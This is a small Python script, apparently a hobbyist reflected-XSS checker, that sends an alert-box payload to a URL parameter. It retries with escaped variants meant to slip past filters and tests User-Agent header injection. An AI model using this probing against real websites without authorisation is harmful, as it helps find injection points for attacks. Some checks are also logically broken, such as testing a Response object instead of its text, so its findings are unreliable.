import requests
import sys
import argparse
try:
    from html import escape  # python 3.x
except ImportError:
    from cgi import escape  # python 2.x

# Made by luu176

usage = """
          Usage: python xss_checker.py -u <url> -p <payload, default="<script>alert('test');</script>">
          url needs to end with a equal sign such as ?q=... or ?search=... etc
          """

parser = argparse.ArgumentParser(description=usage)

parser.add_argument('-p', type=str, help="payload, default=<script>alert('fsociety');</script>")
parser.add_argument('-u', type=str, help='url')
args = parser.parse_args()



def xss(url, payload):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'}
    encode1 = escape(payload)
    print(encode1)
    encode2 = escape(encode1) # double encode the payload to bypass some security filters  
    response1 = requests.get(url + payload, headers=headers)
    response2 = requests.get(url + encode1, headers=headers)
    response3 = requests.get(url + encode2, headers=headers)
    print("Trying first payload...")
    if (response1.status_code == 403) or (not payload in response1.text): #checks if website vulnerable to plain XSS payload with no encoding
        print("First payload might fail")
        if headers["User-Agent"] in response1.text:
            print("FOUND A POSSIBLE ENTRY. Modifying User-Agent to an XSS payload...")
            if payload in requests.get(url + payload, headers={'User-Agent': payload}):
                vuln = "Changing User-Agent to an XSS payload is a vulnerability"
                print(vuln)
                return vuln
            else:
                print("Not vulnerable to User-Agent based XSS, skipping")
        else:
            print("Not vulnerable to User-Agent based XSS, skipping")
        if (response2.status_code == 403) or (not payload in response2.text):
            print("Second payload might fail")
            if headers["User-Agent"] in response2.text:
                print("FOUND A POSSIBLE ENTRY. Modifying User-Agent to an XSS payload...")
                if payload in requests.get(url + encode1, headers={'User-Agent': payload}):
                    vuln = "Changing User-Agent to an XSS payload is a vulnerability"
                    print(vuln)
                    return vuln
                else:
                    print("Not vulnerable to User-Agent based XSS, skipping")
            else:
                print("Not vulnerable to User-Agent based XSS, skipping")
        if (response3.status_code == 403) or (not payload in response3.text):
            print("Third payload might fail")
            if headers["User-Agent"] in response3.text:
                print("FOUND A POSSIBLE ENTRY. Modifying user agent to an XSS payload...")
                if payload in requests.get(url + encode2, headers={'User-Agent': payload}):
                    vuln = "Changing User-Agent to an XSS payload is a vulnerability"
                    print(vuln)
                    return vuln
                else:
                    print("Not vulnerable to User-Agent based XSS, skipping")
            else:
                print("Not vulnerable to User-Agent based XSS, skipping")
        elif payload in response3.text:
            vuln = f"Vulnerable to encoding payload 1 time: {url + encode2}"
            print(vuln)
            return vuln
        elif payload in response2.text:
            vuln = f"Vulnerable to encoding payload 1 time: {url + encode1}"
            print(vuln)
            return vuln
    elif payload in response1.text:
        vuln = f"WEBSITE MAY BE VULNERABLE TO XSS: {url + payload}"
        print(vuln)
        return vuln
    
    
    return """
    
    
    
    
    This parameter does NOT seem vulnerable to XSS attack, this is still a very basic tool, so there could be mistakes."""
    
default_payload = "<script>alert('fsociety');</script>"

if args.p:
    payload = args.p
else:
    payload = default_payload

if args.u:
    url = args.u
else:
    print(usage)
    exit()

if (not url.endswith("=")):
    print(usage)
    exit()
elif (not (url.startswith('http') or url.startswith('https'))):
    url = 'http://' + url
    print(xss(url, payload))
else:
    print(xss(url, payload))


